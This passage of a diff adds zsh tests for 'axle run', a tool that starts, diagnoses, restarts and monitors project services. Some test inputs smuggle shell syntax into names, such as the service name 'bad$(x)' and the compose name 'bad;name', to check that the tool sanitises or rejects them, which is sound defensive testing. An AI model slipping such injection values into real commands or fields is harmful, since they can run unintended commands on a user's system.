+    "_axle_run_start $T/web web; : > $T/started" > $T/setup.zsh
+  zpty sh "HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME XDG_CACHE_HOME=$XDG_CACHE_HOME XDG_DATA_HOME=$XDG_DATA_HOME HISTFILE=$T/hist TERM=xterm AXLE_UPDATE_CHECK=0 zsh -f -i"
+  zpty -w sh "PS1='> '; source $T/setup.zsh"
+  local -i i; local c
+  for i in {1..100}; do while zpty -rt sh c 2>/dev/null; do :; done; [[ -e $T/started ]] && break; sleep 0.1; done
+  wait_state web up
+  local pid=$(<$HOME/.local/state/axle/run/services/web/pid)
+  zpty -d sh 2>/dev/null                         # close the terminal
+  for i in {1..60}; do kill -0 $pid 2>/dev/null || break; sleep 0.1; done
+  kill -0 $pid 2>/dev/null && fail "the service stops with its terminal"
+  # (its supervisor clears the state once the service is gone: a moment later)
+  for i in {1..50}; do [[ -e $HOME/.local/state/axle/run/services/web ]] || break; sleep 0.1; done
+  [[ -e $HOME/.local/state/axle/run/services/web ]] && fail "and leaves nothing"
+  return 0
+}
+
+# AXLE_RUN_OPEN=1 opens the browser once it's up; AXLE_RUN_TRUST=always doesn't ask.
+test_run_open_and_trust_settings() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  mkdir -p $T/bin $T/site; print '<!doctype html>' > $T/site/index.html
+  local o
+  for o in wslview xdg-open open; do
+    print -l '#!/bin/sh' "echo \"\$1\" >> $T/opened" > $T/bin/$o; chmod +x $T/bin/$o
+  done
+  path=($T/bin $path)
+  fake_terminal; axle_confirm() { print -r -- "ASKED $1"; return 0 }
+  cd $T/site
+  axle run set command $py $ROOT/tests/serve.py $port >/dev/null
+  axle run set kind service >/dev/null; axle run set port $port >/dev/null
+  AXLE_RUN_OPEN=1 axle run >/dev/null 2>&1
+  wait_state site up
+  local -i i
+  for i in {1..30}; do [[ -s $T/opened ]] && break; sleep 0.1; done
+  assert_eq "$(<$T/opened)" "http://localhost:$port" "the browser opens it"
+  axle run restart >/dev/null 2>&1; wait_state site up; sleep 0.3
+  assert_eq "$(<$T/opened)" "http://localhost:$port" "but not on a restart"
+  axle run stop >/dev/null
+  axle run set command >/dev/null; axle run set port >/dev/null; axle run set kind >/dev/null
+  local out
+  out=$(AXLE_RUN_TRUST=always axle run --fg --dry-run 2>&1)
+  assert_contains "$out" "runs without asking (AXLE_RUN_TRUST=always)" "dry run says so"
+  axle run set kind task >/dev/null
+  axle run set command $py -c 'print("ran")' >/dev/null    # (yours: never asked anyway)
+  axle run set command >/dev/null
+  mkdir -p $T/py; print '[project]' > $T/py/pyproject.toml; print 'print("ran")' > $T/py/main.py
+  cd $T/py
+  out=$(AXLE_RUN_TRUST=always axle run </dev/null 2>&1)
+  assert_contains "$out" "not asked: AXLE_RUN_TRUST=always"
+  assert_contains "$out" "ran"
+  [[ $out == *ASKED* ]] && fail "not asked: $out"
+  return 0
+}
+
+# --- M6: when it goes wrong -----------------------------------------------------------
+
+# diag <dir> <log text>: diagnose it from <dir>; "cause|remedy" in REPLY.
+diag() {
+  print -r -- "$2" > $T/diag.log
+  local here=$PWD; cd $1
+  _axle_run_diagnose $1 $T/diag.log $3; local -i st=$?
+  cd $here
+  REPLY="$_axle_run_cause|$_axle_run_remedy"
+  return st
+}
+
+# Each known cause in a log yields its fix.
+test_run_diagnose_known_causes() {
+  AXLE_MODULES=(run) load_tool
+  _axle_run_explain >/dev/null 2>&1                # (loads it)
+  local REPLY py=python3; (( $+commands[python3] )) || py=python
+  local missing="Traceback (most recent call last):
+  File \"app.py\", line 1, in <module>
+    import flask
+ModuleNotFoundError: No module named 'flask'"
+  # Python: a venv without it; listed in requirements.txt; no venv; another import name.
+  mkdir -p $T/py1/.venv/bin $T/py2/.venv/bin; : > $T/py1/.venv/pyvenv.cfg; : > $T/py1/app.py
+  ln -s ${commands[$py]} $T/py1/.venv/bin/python; ln -s ${commands[$py]} $T/py2/.venv/bin/python
+  diag $T/py1 "$missing"
+  assert_eq "$REPLY" "no module named flask (not installed in .venv)|.venv/bin/pip install flask" "venv"
+: > $T/py2/.venv/pyvenv.cfg; print 'Flask==3.0  # web' > $T/py2/requirements.txt
+  diag $T/py2 "$missing"
+  assert_eq "$REPLY" "no module named flask: requirements.txt isn't installed in .venv|.venv/bin/pip install -r requirements.txt" "requirements"
+  mkdir -p $T/py3; : > $T/py3/app.py
+  diag $T/py3 "ImportError: No module named yaml.loader"
+  assert_eq "$REPLY" "no module named yaml, and the project has no venv|$py -m venv .venv && .venv/bin/pip install pyyaml" "no venv"
+  mkdir -p $T/py5/env; : > $T/py5/env/pyvenv.cfg; : > $T/py5/app.py   # (no bin/python)
+  diag $T/py5 "$missing"
+  assert_eq "$REPLY" "no module named flask, and env has no working Python|$py -m venv --clear env && env/bin/pip install flask" "broken venv"
+  mkdir -p $T/py4/models; : > $T/py4/app.py
+  diag $T/py4 "ModuleNotFoundError: No module named 'models'"
+  assert_contains "$REPLY" "it's in the project"
+  # Node: no node_modules (pnpm); installed but missing one; not in package.json; a bin.
+  mkdir -p $T/n1; print '{"dependencies": {"express": "^4"}}' > $T/n1/package.json; : > $T/n1/pnpm-lock.yaml
+  diag $T/n1 "Error: Cannot find module 'express'"
+  assert_eq "$REPLY" "its packages aren't installed (no node_modules)|pnpm install" "node_modules"
+  mkdir -p $T/n2/node_modules; print '{"dependencies": {"@acme/ui": "1"}}' > $T/n2/package.json
+  diag $T/n2 "Error [ERR_MODULE_NOT_FOUND]: Cannot find package '@acme/ui/button' imported from x"
+  assert_eq "$REPLY" "@acme/ui isn't installed (it's in package.json)|npm install" "scoped"
+  diag $T/n2 "Error: Cannot find module 'lodash/merge'"
+  assert_eq "$REPLY" "lodash isn't in package.json|npm install lodash" "not in package.json"
+  diag $T/n2 "sh: 1: vite: not found"
+  assert_eq "$REPLY" "vite isn't installed (node_modules is missing it)|npm install" "a bin"
+  diag $T/n2 "Error: Cannot find module '/srv/app/main.js'"
+  assert_eq "$REPLY" "a file it imports is missing: /srv/app/main.js|" "its own file"
+  # A port that's taken: from the message, or the service's port.
+  diag $T/n2 "Error: listen EADDRINUSE: address already in use :::3000"
+  [[ $REPLY == "port 3000 is taken"*"|axle run set port "<->" && axle run" ]] || fail "EADDRINUSE: $REPLY"
+  diag $T/py1 " * Serving Flask app 'app'
+Address already in use
+Port 5000 is in use by another program. Either identify and stop that program, or start the server with a different port."
+  [[ $REPLY == "port 5000 is taken"* ]] || fail "werkzeug: $REPLY"
+  diag $T/py1 "OSError: [Errno 98] Address already in use" 8123
+  [[ $REPLY == "port 8123 is taken"* ]] || fail "the service's port: $REPLY"
+  # A database: in the compose file (by image), else not running.
+  mkdir -p $T/db1; print 'services:\n  web:\n    build: .\n  store:\n    image: "postgres:16"\nvolumes:\n  data:' > $T/db1/compose.yaml
+  diag $T/db1 'psycopg2.OperationalError: connection to server at "localhost" (127.0.0.1), port 5432 failed: Connection refused'
+  assert_eq "$REPLY" "can't reach postgres (:5432): it's store in compose.yaml, not started|docker compose up -d store" "compose"
+  diag $T/n2 "Error 111 connecting to localhost:6379. Connection refused."
+  assert_contains "$REPLY" "can't reach redis on :6379: it isn't running"
+  # From another folder: cd there first.
+  _axle_run_diagnose $T/n1 $T/diag.log >/dev/null
+  print -r -- "Error: Cannot find module 'express'" > $T/diag.log
+  _axle_run_diagnose $T/n1 $T/diag.log
+  assert_eq "$_axle_run_remedy" "cd $T/n1 && pnpm install" "cd"
+  # Nothing in the log: the project (no node_modules); else nothing known.
+  diag $T/n1 "it failed"
+  assert_eq "$REPLY" "its packages aren't installed (no node_modules)|pnpm install" "state"
+  diag $T/py1 "something else" && fail "unknown: $REPLY"
+  return 0
+}
+
+# A crash says why, and its fix goes to Esc Esc / fix until the next command.
+test_run_crash_fix_on_the_line() {
+  AXLE_MODULES=(run fix) load_tool
+  mkdir -p $T/api/.venv/bin; : > $T/api/.venv/pyvenv.cfg; : > $T/api/main.py
+  ln -s ${commands[python3]:-${commands[python]}} $T/api/.venv/bin/python
+  cd $T/api
+  axle run set command sh -c "echo \"ModuleNotFoundError: No module named 'requests'\"; exit 1" >/dev/null
+  axle run set kind service >/dev/null
+  axle run --yes > $T/out 2>&1
+  local out=$(<$T/out)
+  assert_contains "$out" "no module named requests (not installed in .venv)"
+  assert_contains "$out" ".venv/bin/pip install requests && axle run restart api"
+  assert_contains "$out" "Esc Esc puts it on the line"
+  assert_eq "$_axle_run_fix" ".venv/bin/pip install requests && axle run restart api" "for Esc Esc"
+  # `fix` reads it (its own command doesn't clear it); then any other command does.
+  _axle_run_fix_clear fix
+  _axle_fix_cmd; local line; read -z line
+  assert_eq "$line" ".venv/bin/pip install requests && axle run restart api" "fix"
+  axle run logs api > $T/out 2>&1                  # (into a file: the log, no explanation)
+  assert_contains "$(<$T/out)" "No module named 'requests'"
+  [[ $(<$T/out) == *"no module named requests ("* ]] && fail "piped logs are just the log"
+  _axle_run_fix_clear ls
+  assert_eq "$_axle_run_fix" "" "cleared by the next command"
+  (( ${preexec_functions[(Ie)_axle_run_fix_clear]} )) && fail "and unhooked"
+  axle run stop api >/dev/null 2>&1
+  # A task in the foreground: from the project (its packages aren't installed).
+  mkdir -p $T/cli; print '{"dependencies": {"chalk": "5"}}' > $T/cli/package.json
+  cd $T/cli
+  axle run set command sh -c 'exit 1' >/dev/null
+  axle run --yes > $T/out 2>&1
+  assert_contains "$(<$T/out)" "its packages aren't installed (no node_modules)"
+  assert_eq "$_axle_run_fix" "npm install && axle run" "task"
+  return 0
+}
+
+# A fake venv at <path>: python, and a pip that logs what it's asked (and the pins it's
+# given), and fails to resolve with pins when $T/conflict exists. Flask 3.0.0 installed.
+fake_venv() {
+  mkdir -p $1/bin $1/lib/python3.12/site-packages/Flask-3.0.0.dist-info
+  : > $1/pyvenv.cfg
+  ln -s ${commands[python3]:-${commands[python]}} $1/bin/python
+  print -r -- '#!/bin/sh
+echo "pip $* (in $PWD)" >> "'$T'/pip.log"
+while [ $# -gt 0 ]; do
+  if [ "$1" = -c ]; then cat "$2" >> "'$T'/pip.log"; [ -e "'$T'/conflict" ] && { echo "ERROR: ResolutionImpossible"; exit 1; }; fi
+  shift
+done
+echo installed' > $1/bin/pip
+  chmod +x $1/bin/pip
+}
+
+# axle run deps: into the shared venv (made the first time), keeping its versions; its own
+# venv when they conflict, used from then on; pyproject.toml's dependencies.
+test_run_deps_shared_venv() {
+  AXLE_MODULES=(run) load_tool
+  (( $+commands[python3] || $+commands[python] )) || return 0
+  _axle_run_unifolder x                            # (loads it)
+  _axle_run_mkvenv() { fake_venv $1 }
+  _axle_run_diagnose >/dev/null 2>&1
+  local REPLY out; local -a reply
+  typeset -g AXLE_RUN_UNIVENV="$T/Projects"
+  mkdir -p $T/Projects/a $T/Projects/b
+  print 'flask==3.0.0' > $T/Projects/a/requirements.txt
+  print 'flask==2.0.0' > $T/Projects/b/requirements.txt
+  # No venv yet: a crash offers it.
+  diag $T/Projects/a "ModuleNotFoundError: No module named 'flask'"
+  assert_eq "$REPLY" "no module named flask, and the project has no venv (it can share $T/Projects/.venv)|axle run deps" "no venv yet"
+  cd $T/Projects/a
+  axle run deps > $T/out 2>&1 || fail "deps: $(<$T/out)"
+  out=$(<$T/out)
+  assert_contains "$out" "the shared venv for $T/Projects (AXLE_RUN_UNIVENV) doesn't exist yet"
+  assert_contains "$(<$T/pip.log)" "pip install -c $_axle_run_dir/deps.$$.pins -r requirements.txt (in $T/Projects/a)"
+  assert_contains "$(<$T/pip.log)" "Flask==3.0.0"
+  [[ -e $_axle_run_dir/deps.$$.pins || -e $_axle_run_dir/deps.$$.log ]] && fail "leaves its files"
+  _axle_venv_find $T/Projects/a; assert_eq "$REPLY" "$T/Projects/.venv" "a uses it"
+  # Another import: into the shared one, with its name on PyPI.
+  diag $T/Projects/a "ModuleNotFoundError: No module named 'yaml'"
+  assert_eq "$REPLY" "no module named yaml (not in the shared venv $T/Projects/.venv)|axle run deps pyyaml" "shared"
+  # A conflict: b gets its own, and keeps it.
+  : > $T/pip.log; : > $T/conflict
+  cd $T/Projects/b
+  axle run deps > $T/out 2>&1 || fail "deps b: $(<$T/out)"
+  assert_contains "$(<$T/out)" "conflict with the shared venv's, so b gets its own: .venv"
+  assert_contains "$(<$T/pip.log)" "pip install -r requirements.txt (in $T/Projects/b)"
+  _axle_venv_find $T/Projects/b; assert_eq "$REPLY" "$T/Projects/b/.venv" "b's own"
+  diag $T/Projects/b "ModuleNotFoundError: No module named 'yaml'"
+  assert_eq "$REPLY" "no module named yaml (not installed in .venv)|.venv/bin/pip install pyyaml" "its own"
+  # pyproject.toml's dependencies; outside the folders, its own venv.
+  mkdir -p $T/solo; print '[project]\nname = "solo"\ndependencies = [\n  "requests>=2",  # http\n  '"'rich'"',\n]\n\n[tool.x]\ndependencies = ["no"]' > $T/solo/pyproject.toml
+  _axle_run_deps_list $T/solo; assert_eq "${(j:|:)reply}" "requests>=2|rich" "pyproject"
+  : > $T/pip.log; rm $T/conflict
+  cd $T/solo
+  axle run deps click > $T/out 2>&1 || fail "deps solo: $(<$T/out)"
+  assert_contains "$(<$T/pip.log)" "pip install requests>=2 rich click (in $T/solo)"
+  [[ -e $T/solo/.venv/pyvenv.cfg ]] || fail "solo's own venv"
+  return 0
+}
+
+# --- M7: axle run top -----------------------------------------------------------------
+
+# Both views: the mini one without a terminal; the full frame fills the screen exactly,
+# fits its width at any size, redraws in place (no clearing: no flicker), and a sample plus
+# a frame stays cheap (1 Hz under 1% CPU means well under 10 ms each).
+test_run_top_views() {
+  setopt localoptions extendedglob
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  web_project $port || return 0
+  _axle_run_start $T/web web
+  wait_state web up || return 0
+  mkdir -p $T/bad; typeset -ga _axle_run_cmd=(sh -c 'echo boom; exit 2'); typeset -g _axle_run_port=''
+  _axle_run_start $T/bad bad
+  wait_state bad crashed || return 0
+  local out=$(axle run top </dev/null)
+  assert_contains "$out" "axle run top · 2 services"
+  assert_contains "$out" "web"
+  assert_contains "$out" ":$port"
+  assert_contains "$out" "exit 2 (axle run logs bad)"
+  [[ $out == *$'\e'* ]] && fail "no colours without a terminal"
+  # The full frame.
+  _axle_top_init; _axle_top_sample; sleep 1.1; _axle_top_sample
+  local -a reply lines; local l plain size
+  for size in 100x30 80x24 160x50; do
+    _axle_top_full ${size%x*} ${size#*x} web ''
+    lines=($reply)
+    assert_eq ${#lines} ${size#*x} "$size: fills the screen"
+    for l in $lines; do
+      plain=${l//$'\e'\[[0-9;]#m/}
+      (( ${(m)#plain} <= ${size%x*} )) || fail "$size: a line is too wide (${(m)#plain}): $plain"
+    done
+    plain=${(F)lines//$'\e'\[[0-9;]#m/}
+    assert_contains "$plain" "╭─ axle run top"
+    assert_contains "$plain" "╭─ services"
+    assert_contains "$plain" "╭─ web"
+    assert_contains "$plain" "╭─ log"
+    assert_contains "$plain" "▶ ${${commands[python3]:-$commands[python]}:t} "
+    assert_contains "$plain" "localhost:$port"
+  done
+  # Drawn over the last frame: home, no clearing.
+  COLUMNS=100 LINES=30 _axle_top_draw full web '' > $T/frame
+  out=$(<$T/frame)
+  [[ $out == $'\e[H'* ]] || fail "starts at home"
+  [[ $out == *$'\e[2J'* ]] && fail "never clears the screen"
+  _axle_top_drawn=0
+  COLUMNS=100 _axle_top_draw mini web '' > $T/frame; COLUMNS=100 _axle_top_draw mini web '' > $T/frame
+  [[ $(<$T/frame) == $'\r\e[2A'* ]] || fail "mini redraws over its 3 lines"
+  # An arrow key whose bytes come apart (Windows Terminal, WSL) is still an arrow.
+  out=$( { print -n $'\e'; sleep 0.05; print -n '[A' } | { _axle_top_key 1; print -r -- $REPLY } )
+  assert_eq "$out" "up" "an arrow key in pieces"
+  out=$( print -n 'j' | { _axle_top_key 1; print -r -- $REPLY } )
+  assert_eq "$out" "j" "a letter"
+  # Graphs.
+  _axle_top_graph "0 50 100" 3 2; assert_eq "${(j:|:)reply}" "  █| ██" "graph"
+  _axle_top_spark "0 50 100" 4 100; assert_eq "$REPLY" "  ▄█" "spark"
+  # Cost: ten samples and frames.
+  local -F t0=$EPOCHREALTIME
+  local -i i
+  for i in {1..10}; do _axle_top_sample; _axle_top_full 120 40 web ''; done
+  local -F ms=$(( (EPOCHREALTIME - t0) * 100 ))
+  (( ms < 50 )) || fail "a sample and a frame took ${ms} ms"
+  axle run stop all >/dev/null 2>&1
+  return 0
+}
+
+# --- M8: the run's upkeep ---------------------------------------------------------------
+
+# A log past AXLE_RUN_LOG_MAX is cut: what came before goes to log.1, and it goes on.
+test_run_log_is_kept_small() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/chatty
+  typeset -ga _axle_run_cmd=(sh -c 'i=0; while :; do echo "line $i: some output to fill the log up"; i=$((i+1)); sleep 0.005; done')
+  typeset -g _axle_run_kind=service _axle_run_port=''
+  AXLE_RUN_LOG_MAX=4K _axle_run_start $T/chatty chatty
+  local d=$HOME/.local/state/axle/run/services/chatty
+  local -i i
+  for i in {1..80}; do [[ -s $d/log.1 ]] && break; sleep 0.1; done
+  [[ -s $d/log.1 ]] || fail "log.1 after the limit"
+  local -a st; zstat -A st +size -- $d/log
+  (( st[1] < 4096 * 3 )) || fail "the log was cut ($st[1] bytes)"
+  assert_contains "$(<$d/log.1)$(<$d/log)" "axle run: the log reached 4K"
+  _axle_run_alive $d || fail "it keeps running"
+  axle run stop chatty >/dev/null
+  return 0
+}
+
+# Restart on crash: again after each crash (hooks once each), the count in the tab; after 5
+# quick crashes it stays down; stopped, it's not started again; the setting per project.
+test_run_restart_on_crash() {
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/flaky
+  print -r -- 0 > $T/count
+  typeset -ga _axle_run_cmd=(sh -c "n=\$(cat $T/count); echo \$((n+1)) > $T/count; echo try; exit 3")
+  typeset -g _axle_run_kind=service _axle_run_port=''
+  local d=$HOME/.local/state/axle/run/services/flaky
+  _AXLE_RUN_BACKOFF_CS=5 AXLE_RUN_RESTART=on-crash _axle_run_start $T/flaky flaky
+  local -i i
+  for i in {1..100}; do [[ $(<$d/state 2>/dev/null) == crashed ]] && break; sleep 0.1; done
+  assert_eq "$(<$d/state)" crashed "stays down after 5 quick crashes"
+  assert_eq "$(<$T/count)" 6 "the first run and 5 more"
+  assert_eq "$(<$d/restarts)" 5 "counted"
+  assert_contains "$(<$d/log)" "crashed 6 times in a row"
+  assert_contains "$(<$d/log)" "starting it again in 1s (restart 1)"
+  axle run stop flaky >/dev/null 2>&1
+  # Stopped while it waits to start again: it stays stopped.
+  print -r -- 0 > $T/count
+  _AXLE_RUN_BACKOFF_CS=300 AXLE_RUN_RESTART=on-crash _axle_run_start $T/flaky flaky
+  for i in {1..50}; do [[ $(<$d/state 2>/dev/null) == restarting ]] && break; sleep 0.1; done
+  assert_eq "$(<$d/state)" restarting "waiting to start again"
+  _axle_run_load_drop() { REPLY=$(<$HOME/.cache/axle/drops/run-flaky) }
+  _axle_run_load_drop; assert_contains "$REPLY" "starting again"
+  axle run stop flaky >/dev/null 2>&1
+  sleep 0.5
+  assert_eq "$(<$T/count)" 1 "not started again once stopped"
+  [[ -d $d ]] && fail "and forgotten"
+  # Per project: axle run set restart on-crash.
+  print '<!doctype html>' > $T/flaky/index.html     # (a project)
+  cd $T/flaky
+  axle run set command sh -c 'exit 4' >/dev/null; axle run set kind service >/dev/null
+  axle run set restart on-crash >/dev/null
+  _AXLE_RUN_BACKOFF_CS=300 axle run --yes > $T/out 2>&1
+  assert_contains "$(<$T/out)" "starts again by itself"
+  assert_eq "$(<$d/onfail)" on-crash "saved with it"
+  axle run stop flaky >/dev/null 2>&1
+  axle run set restart nope >/dev/null 2>&1 && fail "on-crash or no"
+  return 0
+}
+
+# axle run :task: found in package.json, a justfile, a Makefile, pyproject, cargo, go, pytest
+# (read as text); run with the words after it; asked the first time; its exit code.
+test_run_tasks() {
+  setopt localoptions extendedglob
+  AXLE_MODULES=(run) load_tool
+  _axle_ui_tty </dev/null                          # (loads ui.zsh before any mock)
+  mkdir -p $T/bin $T/p/tests
+  local tool
+  for tool in npm make just; do
+    print -r -- "#!/bin/sh
+echo \"$tool \$*\" >> $T/ran
+[ \"\$2\" = fails ] && exit 7
+exit 0" > $T/bin/$tool
+    chmod +x $T/bin/$tool
+  done
+  path=($T/bin $path)
+  print -r -- '{"scripts": {"test": "jest", "pretest": "lint", "preview": "vite preview", "fails": "x"}}' > $T/p/package.json
+  print -r -- $'.PHONY: all\nCC := gcc\nall: build\nbuild:\n\techo b\n%.o: %.c\n\tcc $<\nclean:\n\trm -rf out' > $T/p/Makefile
+  print -r -- $'set shell := ["bash", "-c"]\nalias b := build\ndeploy env="prod":\n    echo {{env}}' > $T/p/justfile
+  print -r -- $'[project]\nname = "p"\n[project.scripts]\nserve = "p.app:main"\n[tool.x]\nnot = "this"' > $T/p/pyproject.toml
+  : > $T/p/Cargo.toml
+  cd $T/p
+  local out=$(axle run : 2>&1)
+  out=${out//$'\e'\[[0-9;]#m/}
+  local t
+  for t in ':test  ' ':preview' ':fails' ':deploy' ':all' ':build' ':clean' ':serve' ':check' ':clippy'; do
+    assert_contains "$out" "$t"
+  done
+  assert_contains "$out" $'  package.json (npm)\n    :test     npm run test'
+  assert_contains "$out" $'  justfile\n    :deploy   just deploy'
+  [[ $out == *':pretest'* ]] && fail "pretest runs with test"
+  [[ $out == *(':.PHONY'|':CC'|':%'|':alias'|':set'|':not')* ]] && fail "not tasks: $out"
+  # Asked the first time (no terminal: the answer is no).
+  axle run :test >/dev/null 2>&1 && fail "asked first"
+  [[ -e $T/ran ]] && fail "not run without a yes"
+  axle run :test -t api --yes >/dev/null 2>&1 || fail "with --yes"
+  axle run :test >/dev/null 2>&1 || fail "approved: not asked again"
+  axle run :all --yes >/dev/null 2>&1
+  axle run :deploy staging --yes >/dev/null 2>&1
+  assert_eq "$(<$T/ran)" "npm run test -- -t api
+npm run test
+make all
+just deploy staging" "the words after it (npm after --)"
+  axle run :fails --yes >/dev/null 2>&1; assert_eq $? 7 "its exit code"
+  out=$(axle run :tst 2>&1)
+  assert_contains "$out" "did you mean :test?"
+  mkdir -p $T/empty; print '<!doctype html>' > $T/empty/index.html; cd $T/empty
+  out=$(axle run : 2>&1)
+  assert_contains "$out" "no tasks in empty"
+  return 0
+}
+
+# What a service needs: a database from its .env that isn't answering, in the compose file,
+# is started first (and waited for); said ones each time; without a compose file, said.
+test_run_needs_started_first() {
+  AXLE_MODULES=(run) load_tool
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY dbport port; free_port; dbport=$REPLY; port=$(( dbport + 1 ))
+  mkdir -p $T/bin $T/app
+  print -r -- "#!/bin/sh
+echo \"docker \$*\" >> $T/docker.log
+case \"\$*\" in *' up -d '*db*) $py $ROOT/tests/serve.py $dbport >/dev/null 2>&1 & echo \$! > $T/db.pid ;; esac
+exit 0" > $T/bin/docker
+  chmod +x $T/bin/docker
+  path=($T/bin $path)
+  print -r -- $'services:\n  api:\n    build: .\n  db:\n    image: postgres:16\n  cache:\n    image: redis:7' > $T/app/compose.yaml
+  print -r -- "DATABASE_URL=postgres://me:secret@localhost:$dbport/app" > $T/app/.env
+  print '<!doctype html>' > $T/app/index.html
+  cd $T/app
+  axle run set command $py $ROOT/tests/serve.py $port >/dev/null
+  axle run set kind service >/dev/null; axle run set port $port >/dev/null
+  axle run --yes > $T/out 2>&1
+  assert_contains "$(<$T/docker.log)" "docker compose -f compose.yaml up -d db"
+  assert_contains "$(<$T/out)" "what app needs: postgres :$dbport (db)"
+  _axle_run_port_up $dbport || fail "waited for it"
+  axle run stop >/dev/null 2>&1
+  # Up already: not started again.
+  : > $T/docker.log
+  axle run --yes > $T/out 2>&1
+  [[ -s $T/docker.log ]] && fail "running already: $(<$T/docker.log)"
+  axle run stop >/dev/null 2>&1
+  # Said: each time.
+  axle run set needs cache >/dev/null
+  axle run --yes > $T/out 2>&1
+  assert_contains "$(<$T/docker.log)" "docker compose -f compose.yaml up -d cache"
+  axle run stop >/dev/null 2>&1
+  axle run set needs 'bad;name' >/dev/null 2>&1 && fail "compose service names only"
+  # No compose service for it: said, and it runs anyway.
+  kill $(<$T/db.pid) 2>/dev/null                    # (the "database" the fake docker started)
+  rm $T/app/compose.yaml; axle run set needs >/dev/null
+  local -i i; for i in {1..20}; do _axle_run_port_up $dbport || break; sleep 0.1; done
+  axle run --yes > $T/out 2>&1
+  assert_contains "$(<$T/out)" "uses postgres on :$dbport, which isn't answering"
+  axle run stop >/dev/null 2>&1
+  return 0
+}
+
+# AXLE_RUN_NOTIFY: a notification when it's ready and when it crashes (from the supervisor,
+# with no shell watching); off by default; a name's odd characters never reach the program.
+test_run_notify() {
+  AXLE_MODULES=(run) load_tool
+  local REPLY port; free_port; port=$REPLY
+  web_project $port || return 0
+  export _AXLE_RUN_NOTIFY_TO=$T/notes
+  AXLE_RUN_NOTIFY=all _axle_run_start $T/web web
+  wait_state web up || return 0
+  local -i i
+  for i in {1..20}; do [[ -s $T/notes ]] && break; sleep 0.1; done
+  assert_eq "$(<$T/notes)" "axle run: web|up on http://localhost:$port" "ready"
+  axle run stop web >/dev/null
+  : > $T/notes
+  mkdir -p $T/bad; typeset -ga _axle_run_cmd=(sh -c 'exit 3'); typeset -g _axle_run_port=''
+  AXLE_RUN_NOTIFY=crash _axle_run_start $T/bad 'bad$(x)'
+  for i in {1..50}; do [[ -s $T/notes ]] && break; sleep 0.1; done
+  assert_eq "$(<$T/notes)" "axle run: bad(x) crashed|exit 3 - axle run logs bad(x)" "crashed, plain characters only"
+  axle run stop all >/dev/null 2>&1
+  : > $T/notes
+  _axle_run_start $T/bad quiet
+  sleep 1
+  [[ -s $T/notes ]] && fail "off by default: $(<$T/notes)"
+  unset _AXLE_RUN_NOTIFY_TO
+  axle run stop all >/dev/null 2>&1
+  return 0
+}
+
+# axle run env: each .env in order (a later one over an earlier), what axle run adds;
+# secrets masked (by name, and a URL's password) unless --show.
+test_run_env_shown() {
+  setopt localoptions extendedglob
+  AXLE_MODULES=(run) load_tool
+  mkdir -p $T/api; cd $T/api
+  print 'from flask import Flask\napp = Flask(__name__)' > app.py; : > requirements.txt
+  print -r -- $'DATABASE_URL=postgres://me:hunter2@localhost:5432/app\nSECRET_KEY=abcdefabcdef\nDEBUG=1' > .env
+  print -r -- $'DEBUG=0\nAPI_TOKEN="t0k"' > .env.prod
+  axle run --profile prod -n >/dev/null 2>&1
+  local out=$(axle run env 2>&1); out=${out//$'\e'\[[0-9;]#m/}
+  assert_contains "$out" "profile prod"
+  assert_contains "$out" "postgres://me:••••@localhost:5432/app"
+  assert_contains "$out" "SECRET_KEY    •••••••• (12 characters)"
+  assert_contains "$out" "API_TOKEN     •••••••• (3 characters)"
+  assert_contains "$out" "DEBUG         0  (over .env)"
+  assert_contains "$out" "PORT          5000"
+  [[ $out == *(hunter2|abcdefabcdef|t0k)* ]] && fail "secrets shown: $out"
+  out=$(axle run env --show 2>&1)
+  assert_contains "$out" "hunter2"
+  assert_contains "$out" "abcdefabcdef"
+  return 0
+}
+
+# axle run set health /healthz: up once that path answers (not just the port), then checked
+# again and again: unhealthy after 3 failures, up again when it answers.
+test_run_health_checks() {
+  AXLE_MODULES=(run) load_tool
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY port; free_port; port=$REPLY
+  mkdir -p $T/hs; print '<!doctype html>' > $T/hs/index.html
+  print 503 > $T/status
+  cd $T/hs
+  axle run set command $py $ROOT/tests/health.py $port $T/status >/dev/null
+  axle run set kind service >/dev/null; axle run set port $port >/dev/null
+  axle run set health /healthz >/dev/null
+  axle run set health 'no path' >/dev/null 2>&1 && fail "a path"
+  local d=$HOME/.local/state/axle/run/services/hs
+  export _AXLE_RUN_HEALTH_EVERY=1
+  axle run --yes >/dev/null 2>&1
+  local -i i
+  for i in {1..30}; do _axle_run_port_up $port && break; sleep 0.1; done
+  sleep 1
+  assert_eq "$(<$d/state)" starting "the port answers, /healthz doesn't: not up"
+  print 200 > $T/status
+  wait_state hs up || fail "up once /healthz answers"
+  print 500 > $T/status
+  wait_state hs unhealthy || fail "unhealthy after 3 failures"
+  assert_contains "$(<$HOME/.cache/axle/drops/run-hs)" "unhealthy"
+  assert_contains "$(axle run ls)" "unhealthy"
+  print 200 > $T/status
+  wait_state hs up || fail "up again"
+  unset _AXLE_RUN_HEALTH_EVERY
+  axle run stop >/dev/null 2>&1
+  return 0
+}
+
+# axle run group: projects added and taken out; started together (in the background), each
+# asked as axle run asks; stopped together.
+test_run_groups() {
+  AXLE_MODULES=(run) load_tool
+  local py; py=$(whence -p python3 || whence -p python) || return 0
+  local REPLY p1 p2; free_port; p1=$REPLY; p2=$(( p1 + 1 ))
+  mkdir -p $T/front $T/back
+  print '<!doctype html>' > $T/front/index.html; print '<!doctype html>' > $T/back/index.html
+  cd $T/front; axle run set command $py $ROOT/tests/serve.py $p1 >/dev/null; axle run set port $p1 >/dev/null; axle run set kind service >/dev/null
+  cd $T/back;  axle run set command $py $ROOT/tests/serve.py $p2 >/dev/null; axle run set port $p2 >/dev/null; axle run set kind service >/dev/null
+  cd $T/front
+  assert_contains "$(axle run group dev add)" "dev: front"
+  assert_contains "$(axle run group dev add $T/back)" "dev: front, back"
+  assert_contains "$(axle run group)" "front, back"
+  axle run group 'bad name' add >/dev/null 2>&1 && fail "a plain name"
+  cd $T
+  axle run group dev > $T/out 2>&1 || fail "started: $(<$T/out)"
+  wait_state front up || fail "front"
+  wait_state back up || fail "back"
+  assert_contains "$(axle run group dev stop)" "stopped back"
